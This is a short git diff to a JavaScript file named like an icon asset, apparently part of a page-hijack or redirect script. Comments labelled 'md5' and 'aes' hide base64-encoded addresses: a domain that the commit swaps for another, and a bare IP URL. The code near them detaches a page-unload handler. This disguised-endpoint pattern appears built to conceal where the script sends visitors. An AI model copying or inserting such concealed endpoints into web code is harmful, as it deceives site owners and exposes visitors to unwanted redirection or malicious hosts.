391d366e5b4aa112d71312a1eb16133754cce799
caocaodage <caocaodajun@gmail.com>
2021-08-05 11:07:45 +0800

    init

--- js/icon_79x38c.js
+++ js/icon_79x38c.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:d3d3LmhhaW5hbnRvdXpodTY2Ni5jb20=**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
+})()/** md5:aHR0cHM6Ly93d3cuMzg1Mzc3MjAuY29t**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
